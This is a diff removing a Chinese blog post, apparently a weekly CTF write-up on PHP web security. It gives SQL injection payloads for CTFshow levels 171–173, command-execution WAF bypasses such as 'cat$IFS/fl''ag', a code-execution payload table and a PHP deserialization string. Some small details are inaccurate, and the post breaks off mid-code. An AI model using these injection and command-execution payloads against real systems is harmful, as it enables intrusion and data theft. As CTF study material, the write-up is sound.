@@ -78,607 +78,14 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-2026-W45-学习周报" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2026/11/01/2026-W45-%E5%AD%A6%E4%B9%A0%E5%91%A8%E6%8A%A5/" class="article-date">
-  <time class="dt-published" datetime="2026-10-31T16:00:00.000Z" itemprop="datePublished">2026-11-01</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%91%A8%E6%8A%A5/">第二周周报</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2026/11/01/2026-W45-%E5%AD%A6%E4%B9%A0%E5%91%A8%E6%8A%A5/">2026-W45 学习周报 - PHP/Web 安全 WP（SQL注入·RCE·反序列化）</a>
-    </h1>
-  
-
-      </header>
     
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>⚠️ <strong>本周完整 WP 已导出为 PDF，点击下方链接直接打开查看。</strong></p>
-</blockquote>
-<h2 id="📎-配套资料下载"><a href="#📎-配套资料下载" class="headerlink" title="📎 配套资料下载"></a>📎 配套资料下载</h2><h3 id="php-学习文档-WP《sql》-pdf"><a href="#php-学习文档-WP《sql》-pdf" class="headerlink" title="php 学习文档 WP《sql》.pdf"></a>php 学习文档 WP《sql》.pdf</h3><p><strong>用途：</strong> 本周 CTF 刷题完整 WP，覆盖 SQL 注入、RCE、反序列化、文件写入、POP 链</p>
-<p>👉 <a href="/files/php%E5%AD%A6%E4%B9%A0%E6%96%87%E6%A1%A3WP%E3%80%8Asql%E3%80%8B.pdf">点击打开 &#x2F; 下载 php 学习文档 WP《sql》.pdf</a></p>
-<hr>
-<h1 id="一、CTFshow-SQL"><a href="#一、CTFshow-SQL" class="headerlink" title="一、CTFshow SQL"></a>一、CTFshow SQL</h1><h2 id="171-题（Web-SQL注入-联合查询绕过过滤）"><a href="#171-题（Web-SQL注入-联合查询绕过过滤）" class="headerlink" title="171 题（Web-SQL注入 &#x2F; 联合查询绕过过滤）"></a>171 题（Web-SQL注入 &#x2F; 联合查询绕过过滤）</h2><p><strong>关键过滤</strong>：<code>username != &#39;flag&#39;</code> —— 数据库里有个用户叫 flag，但直接被过滤了，正常查询查不到它。</p>
-<p><strong>注入点</strong>：源码里 <code>id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;</code>，用户输入被单引号包裹后拼进 SQL。</p>
-<h3 id="AND-和-OR-的优先级（本题关键）"><a href="#AND-和-OR-的优先级（本题关键）" class="headerlink" title="AND 和 OR 的优先级（本题关键）"></a>AND 和 OR 的优先级（本题关键）</h3><p>SQL 和 C 一样，运算符有优先级：<strong>AND（且）比 OR（或）优先</strong>。对照 C：<code>&amp;&amp;</code> 比 <code>||</code> 优先级高。</p>
-<p>所以这条：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">where</span> username <span class="operator">!=</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> username<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>不是从左往右读，而是 and 先结合：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">where</span> (username <span class="operator">!=</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span>) <span class="keyword">OR</span> (username<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>左边：<code>username!=&#39;flag&#39;</code> 且 id&#x3D;1 → 查出 admin（正常用户）</li>
-<li>右边：<code>username=&#39;flag&#39;</code> → 把 flag 行也拉进来</li>
-</ul>
-<p>因为 OR 只要右边成立，这行就会被选中 → 绕过了 <code>!=flag</code> 的排除。</p>
-<blockquote>
-<p>一句话：and 要求两边都成立（收紧），or 只要一边成立（放宽）。出题人用 <code>!=flag and</code> 想挡住你，你用一个 <code>or username=&#39;flag&#39;</code> 把”后门”打开，flag 就溜出来了。</p>
-</blockquote>
-<h3 id="最终-payload"><a href="#最终-payload" class="headerlink" title="最终 payload"></a>最终 payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or username=flag %23</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>1&#39;</code> 用单引号闭合前面的 <code>id=&#39;1</code></li>
-<li><code>or username=flag</code> 打开第二扇门</li>
-<li><code>%23</code> 是 <code>#</code> 的 URL 编码，注释掉后面残留的 <code>&#39; limit 1;</code>，否则多出来的引号不配对 → SQL 语法错误</li>
-</ul>
-<h3 id="复盘清单"><a href="#复盘清单" class="headerlink" title="复盘清单"></a>复盘清单</h3><table>
-<thead>
-<tr>
-<th>知识点</th>
-<th>应用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>注入点判断</td>
-<td>找 <code>&#39;...&#39;</code> 包裹 + 直接拼接的位置</td>
-</tr>
-<tr>
-<td>闭合引号</td>
-<td>用 <code>&#39;</code> 逃逸出字符串</td>
-</tr>
-<tr>
-<td>注释</td>
-<td>用 <code>#</code> &#x2F; <code>--</code> 吞掉残留（输入框用 <code>%23</code>）</td>
-</tr>
-<tr>
-<td>优先级绕过</td>
-<td>AND 优先 OR，用 or 打开第二扇门</td>
-</tr>
-<tr>
-<td>源码≠真相</td>
-<td>实际 3 列、表名 <code>ctfshow_user</code>，都要靠试</td>
-</tr>
-</tbody></table>
-<blockquote>
-<p>这就是 web171 的完整闭环：<strong>找注入点 → 闭合 → 绕过 → 注释</strong>，是后面所有 SQL 注入题的地基。</p>
-</blockquote>
-<hr>
-<h2 id="172-题（Web-SQL注入-union-联合查询）"><a href="#172-题（Web-SQL注入-union-联合查询）" class="headerlink" title="172 题（Web-SQL注入 &#x2F; union 联合查询）"></a>172 题（Web-SQL注入 &#x2F; union 联合查询）</h2><p>查询语句：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[<span class="string">&#x27;id&#x27;</span>].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>返回逻辑：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>-&gt;username===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>传统的 <code>or and</code> 已经不能绕过 flag 了——后端判断结果集第一行的 username 如果是 flag 就不返回数据。<strong>所以要用联合查询 union。</strong></p>
-<h3 id="union-使用准则"><a href="#union-使用准则" class="headerlink" title="union 使用准则"></a>union 使用准则</h3><ol>
-<li><strong>前后两条 select 列数量必须一样</strong>。原语句 <code>select username,password</code> 是 2 列，后面也要 2 列。</li>
-<li>对应位置的数据类型尽量兼容（第一列对第一列，类型差别太大可能报错）。</li>
-<li>默认 UNION 自动去重；UNION ALL 不去重，速度更快。CTF 注入用 <code>union select</code> 就行。</li>
-<li>union 是拼接两个查询的结果集，前后是两条独立查询，where 条件互不干扰。</li>
-<li>想只显示后面注入的结果：让前面查询查不到数据，常用 <code>id=-1</code>。</li>
-<li><code>limit</code> 只作用于离它最近的那一条 select，不是全局。</li>
-<li><code>order by</code> 也是作用于整个合并后的结果集。</li>
-</ol>
-<blockquote>
-<p>一句话速记：<strong>列数相等、位置对齐、类型兼容；前句置空，只看我们的数据。</strong></p>
-</blockquote>
-<h3 id="构造过程"><a href="#构造过程" class="headerlink" title="构造过程"></a>构造过程</h3><p>先用 <code>-1</code> 闭合前面的查询，让前面查不到信息（数据库里无 -1 的 id）：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,password from ctfshow_user2 where username=&#x27;flag&#x27; and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>and &#39;1&#39;=&#39;1</code>：闭合 SQL 语法。前面我们用单引号把语句打开了，末尾用 <code>and &#39;1&#39;=&#39;1</code> 把剩下的引号对上，防止语法报错。逻辑上 <code>A and 恒真</code> 结果就等于 A，不会改变前面 <code>username=&#39;flag&#39;</code> 的筛选效果。</li>
-<li><code>select &#39;hack&#39;,password</code>：SQL 的 select 不光可以查表字段，还可以直接写常量。第一列输出常量 <code>hack</code>，第二列输出那一行的 password。</li>
-</ul>
-<blockquote>
-<p>SQL 规则：select 写什么，数据库才返回什么。写了 <code>username</code> 就会查出 flag 然后被 PHP 拦截；不写 <code>username</code>、写常量 <code>hack</code>，就绕开了 <code>$row-&gt;username===&#39;flag&#39;</code> 的判断。</p>
-</blockquote>
-<hr>
-<h2 id="173-题（Web-SQL注入-hex-绕正则）"><a href="#173-题（Web-SQL注入-hex-绕正则）" class="headerlink" title="173 题（Web-SQL注入 &#x2F; hex() 绕正则）"></a>173 题（Web-SQL注入 &#x2F; hex() 绕正则）</h2><h3 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h3><ol>
-<li><strong><code>hex()</code> 是 MySQL 自带函数</strong>，在数据库执行 SQL 时就完成转换。</li>
-<li>源码用正则拦截返回结果里的 flag：</li>
-</ol>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>json_encode()</code> 把 PHP 数组转成 JSON 字符串。</li>
-<li>正则 <code>/flag/i</code>：前后 <code>/</code> 是分隔符，<code>flag</code> 匹配这 4 个连续字母，末尾 <code>i</code> 忽略大小写。只要 JSON 字符串里出现 flag 就算匹配成功。</li>
-<li><code>preg_match()</code> 是 PHP 的正则匹配函数。</li>
-</ul>
-<h3 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h3><p>不能直接把 flag 在返回结果里输出，否则正则会拦。<strong>用 <code>hex()</code> 把 password 里的 flag 转成十六进制</strong>，结果里就不会出现 <code>flag</code> 这个字符串，避开正则。</p>
-<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 3,&#x27;hack&#x27;,hex(password) from ctfshow_user3 where username=&#x27;flag&#x27; and &#x27;1&#x27;=1</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>因为 flag 形式是 <code>ctf&#123;...&#125;</code>，里面没有 <code>flag</code> 字样，所以可以不用 hex 正则——但 password 字段里可能含 flag 字符串，用 hex 最保险。</p>
-</blockquote>
-<hr>
-<h1 id="二、ctf"><a href="#二、ctf" class="headerlink" title="二、ctf+"></a>二、ctf+</h1><h2 id="第-1-题-Web-RCE-命令执行-终端特殊字符"><a href="#第-1-题-Web-RCE-命令执行-终端特殊字符" class="headerlink" title="第 1 题 Web-RCE 命令执行 &#x2F; 终端特殊字符"></a>第 1 题 Web-RCE 命令执行 &#x2F; 终端特殊字符</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag| /&quot;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;WAF!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) ? <span class="title function_ invoke__">hello_shell</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) : <span class="literal">null</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
-
-<p>解析：</p>
-<ol>
-<li>空格过滤：<code>preg_match(&quot;/flag| /&quot;)</code> 拦截了空格字符。</li>
-<li>关键字过滤：拦截了连续字符串 <code>flag</code>。</li>
-</ol>
-<h3 id="绕过思路（层级差异）"><a href="#绕过思路（层级差异）" class="headerlink" title="绕过思路（层级差异）"></a>绕过思路（层级差异）</h3><p><strong>WAF 在 PHP 层检查字符串，shell 在 bash 层展开，两者看到的字符串不一样。</strong></p>
-<table>
-<thead>
-<tr>
-<th>被过滤</th>
-<th>绕过方法</th>
-<th>原理</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>空格</td>
-<td><code>$IFS</code></td>
-<td>bash 环境变量，默认值&#x3D;空格+Tab+换行，展开后成为分隔符</td>
-</tr>
-<tr>
-<td>flag 连续串</td>
-<td><code>fl&#39;&#39;ag</code></td>
-<td>单引号空串截断，正则看不到连续 flag，bash 拼回 flag</td>
-</tr>
-</tbody></table>
-<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cat$IFS/fl&#x27;&#x27;ag</span><br></pre></td></tr></table></figure>
-
-<p>成功原理：</p>
-<ul>
-<li>WAF 层看到：<code>cat$IFS/fl&#39;&#39;ag</code> → 无空格、无连续 flag → 放行</li>
-<li>bash 层执行：<code>cat /flag</code>（<code>$IFS</code>→空格，<code>&#39;&#39;</code>→拼回）</li>
-</ul>
-<p>补充其他空格绕过方法：<code>cat&lt;/flag</code>（输入重定向，不需要空格）。</p>
-<hr>
-<h2 id="第-2-题-Web-RCE-PHP-代码执行函数"><a href="#第-2-题-Web-RCE-PHP-代码执行函数" class="headerlink" title="第 2 题 Web-RCE PHP 代码执行函数"></a>第 2 题 Web-RCE PHP 代码执行函数</h2><h3 id="源码逻辑"><a href="#源码逻辑" class="headerlink" title="源码逻辑"></a>源码逻辑</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_ctf</span>(<span class="params"><span class="variable">$function</span>,<span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$function</span>.<span class="string">&quot;(&quot;</span>.<span class="variable">$content</span>.<span class="string">&quot;);&quot;</span>;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"><span class="variable">$act</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$random_func</span> = <span class="title function_ invoke__">get_func</span>();   <span class="comment">// 随机抽一个函数</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$act</span> == <span class="string">&quot;r&quot;</span>)&#123; <span class="title function_ invoke__">session_unset</span>(); <span class="title function_ invoke__">session_destroy</span>(); &#125;  <span class="comment">// 重置随机函数</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$act</span> == <span class="string">&quot;submit&quot;</span>)&#123;</span><br><span class="line">        <span class="variable">$user_content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">hello_ctf</span>(<span class="variable">$random_func</span>, <span class="variable">$user_content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>服务器从 10 个 PHP 函数中随机抽一个：<code>eval / assert / call_user_func / create_function / array_map / call_user_func_array / usort / array_filter / array_reduce / preg_replace</code>。把你的 content 拼进函数调用里用 <code>eval()</code> 执行。flag 存在全局变量 <code>$flag</code>。</p>
-<ul>
-<li><code>GET ?action=r</code> → 重置随机函数</li>
-<li><code>POST ?action=submit</code> → 提交 content 参数</li>
-</ul>
-<h3 id="各函数-Payload-对照表"><a href="#各函数-Payload-对照表" class="headerlink" title="各函数 Payload 对照表"></a>各函数 Payload 对照表</h3><table>
-<thead>
-<tr>
-<th>抽到的函数</th>
-<th>Payload（content）</th>
-<th>原理</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>eval</td>
-<td><code>system(&quot;cat /flag&quot;)</code></td>
-<td>eval 直接执行字符串</td>
-</tr>
-<tr>
-<td>assert</td>
-<td><code>system(&quot;cat /flag&quot;)</code></td>
-<td>assert 把字符串当代码执行</td>
-</tr>
-<tr>
-<td>call_user_func</td>
-<td><code>&#39;system&#39;,&#39;cat /flag&#39;</code></td>
-<td>第一个参数是函数名，后面是参数</td>
-</tr>
-<tr>
-<td>call_user_func_array</td>
-<td><code>&#39;system&#39;,array(&#39;cat /flag&#39;)</code></td>
-<td>第二个参数是参数数组</td>
-</tr>
-<tr>
-<td>usort</td>
-<td><code>$a=array(&#39;cat /flag&#39;,1),&#39;system&#39;</code></td>
-<td>第一个参数必须是变量（按引用传递）</td>
-</tr>
-<tr>
-<td>preg_replace</td>
-<td><code>&#39;/a/e&#39;,&#39;system(&quot;cat /flag&quot;)&#39;,&#39;a&#39;</code></td>
-<td><code>/e</code> 修饰符把替换内容当代码执行</td>
-</tr>
-<tr>
-<td>array_map</td>
-<td><code>&#39;system&#39;,array(&#39;cat /flag&#39;)</code></td>
-<td>第一个是回调函数，第二个是数组</td>
-</tr>
-</tbody></table>
-<h3 id="常见错误"><a href="#常见错误" class="headerlink" title="常见错误"></a>常见错误</h3><ul>
-<li><strong>Session 不保持</strong>：Burp 没带 PHPSESSID cookie → 每次都是新函数。解决：先 GET 拿 cookie，再带同一 cookie 发 POST。</li>
-<li><strong>GET&#x2F;POST 搞混</strong>：GET 不会发送 body，必须用 POST。</li>
-<li><strong>usort 按引用传递</strong>：第一个参数必须是变量，先 <code>$a=array(...)</code> 赋值。</li>
-</ul>
-<h3 id="最终-payload（以-usort-为例）"><a href="#最终-payload（以-usort-为例）" class="headerlink" title="最终 payload（以 usort 为例）"></a>最终 payload（以 usort 为例）</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?action=submit</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>&lt;目标域名&gt;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=&lt;session值&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">content</span>=<span class="variable">$a</span>=array(<span class="string">&#x27;cat /flag&#x27;</span>,<span class="number">1</span>),<span class="string">&#x27;system&#x27;</span></span></span><br></pre></td></tr></table></figure>
-
-<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
-<li>看源码拼接：<code>call_user_func(我们的content)</code></li>
-<li>查手册：<code>call_user_func(函数名, 参数1, 参数2...)</code></li>
-<li>目标是执行 <code>system(&#39;cat /flag&#39;)</code> → 填 <code>&#39;system&#39;,&#39;cat /flag&#39;</code></li>
-</ol>
-<hr>
-<h2 id="第-3-题-Web-RCE-7-字符限制命令执行"><a href="#第-3-题-Web-RCE-7-字符限制命令执行" class="headerlink" title="第 3 题 Web-RCE 7 字符限制命令执行"></a>第 3 题 Web-RCE 7 字符限制命令执行</h2><h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><ul>
-<li>命令长度被限制在 7 个字符以内（7 characters RCE）。</li>
-<li>需要找到正确的参数名。</li>
-</ul>
-<h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
-<li><strong>找参数名</strong>：依次试 <code>?cmd=</code>、<code>?c=</code>、<code>?x=</code> 等，直到 <code>?1=ls</code> 成功列出文件。参数名是 <code>1</code>（服务器写死的）。</li>
-<li><strong>查看目录</strong>：<code>?1=ls</code> 显示当前目录有 <code>2</code> 和 <code>index.php</code>。</li>
-<li><strong>读 2 文件</strong>：<code>?1=cat 2</code> 输出 5，不是 flag。</li>
-<li><strong>去根目录找</strong>：<code>?1=cat /f*</code> 输出 flag。</li>
-</ol>
-<h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1=cat%20/f*</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>1</code> &#x3D; 参数名</li>
-<li><code>cat/f*</code> &#x3D; 6 个字符（c-a-t-空格-&#x2F;-f-*）</li>
-<li><code>/f*</code> &#x3D; 根目录下以 f 开头的文件（通配符 <code>*</code> 匹配到 <code>/flag</code>）</li>
-</ul>
-<h3 id="踩过的坑"><a href="#踩过的坑" class="headerlink" title="踩过的坑"></a>踩过的坑</h3><ul>
-<li>URL 里不能写原始空格，要编码成 <code>%20</code>，否则返回 400 Bad Request。</li>
-<li>参数名不对会报 <code>too long</code>，要先确认正确的参数名。</li>
-</ul>
-<hr>
-<h2 id="第-4-题-Web-Base64-Token-验证"><a href="#第-4-题-Web-Base64-Token-验证" class="headerlink" title="第 4 题 Web-Base64 Token 验证"></a>第 4 题 Web-Base64 Token 验证</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$token</span>) === <span class="string">&#x27;guest&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&#123;...&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p><code>base64_decode(&quot;guest&quot;)</code> 的结果要等于 <code>guest</code>。那要传的值就是 <code>base64_encode(&quot;guest&quot;)</code>。</p>
-<ul>
-<li><code>base64_encode(&quot;guest&quot;)</code> &#x3D; <code>Z3Vlc3Q=</code></li>
-<li>服务器：<code>base64_decode(Z3Vlc3Q=)</code> &#x3D; <code>guest</code> &#x3D;&#x3D;&#x3D; <code>guest</code> → 通过</li>
-</ul>
-<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?token=Z3Vlc3Q=</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="第-5-题-Web-反序列化-PHP-反序列化"><a href="#第-5-题-Web-反序列化-PHP-反序列化" class="headerlink" title="第 5 题 Web-反序列化 PHP 反序列化"></a>第 5 题 Web-反序列化 PHP 反序列化</h2><h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mylogin</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>,<span class="variable">$pass</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass=<span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;user==<span class="string">&quot;daydream&quot;</span> <span class="keyword">and</span> <span class="variable language_">$this</span>-&gt;pass==<span class="string">&quot;ok&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">login</span>())&#123; <span class="keyword">echo</span> <span class="variable">$flag</span>; &#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h3><ol>
-<li>看类定义：类名 <code>mylogin</code>，属性 <code>$user</code>、<code>$pass</code>。</li>
-<li>看验证条件：<code>$user == &quot;daydream&quot;</code> 且 <code>$pass == &quot;ok&quot;</code>。</li>
-<li>构造一个属性满足条件的对象并序列化。</li>
-</ol>
-<h3 id="序列化字符串"><a href="#序列化字符串" class="headerlink" title="序列化字符串"></a>序列化字符串</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;mylogin&quot;:2:&#123;s:4:&quot;user&quot;;s:8:&quot;daydream&quot;;s:4:&quot;pass&quot;;s:2:&quot;ok&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>拆解：</p>
-<table>
-<thead>
-<tr>
-<th>部分</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>O:7:&quot;mylogin&quot;:2:</code></td>
-<td>Object，类名 mylogin（7 字符），2 个属性</td>
-</tr>
-<tr>
-<td><code>s:4:&quot;user&quot;</code></td>
-<td>属性名 user（4 字符）</td>
-</tr>
-<tr>
-<td><code>s:8:&quot;daydream&quot;</code></td>
-<td>属性值 daydream（8 字符）</td>
-</tr>
-<tr>
-<td><code>s:4:&quot;pass&quot;</code></td>
-<td>属性名 pass（4 字符）</td>
-</tr>
-<tr>
-<td><code>s:2:&quot;ok&quot;</code></td>
-<td>属性值 ok（2 字符）</td>
-</tr>
-</tbody></table>
-<p>也可以用 PHP 代码生成（在 onlinephp.io &#x2F; tool.lu&#x2F;php 里跑）：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mylogin</span> </span>&#123; <span class="keyword">var</span> <span class="variable">$user</span>; <span class="keyword">var</span> <span class="variable">$pass</span>; &#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mylogin</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;user = <span class="string">&quot;daydream&quot;</span>;</span><br><span class="line"><span 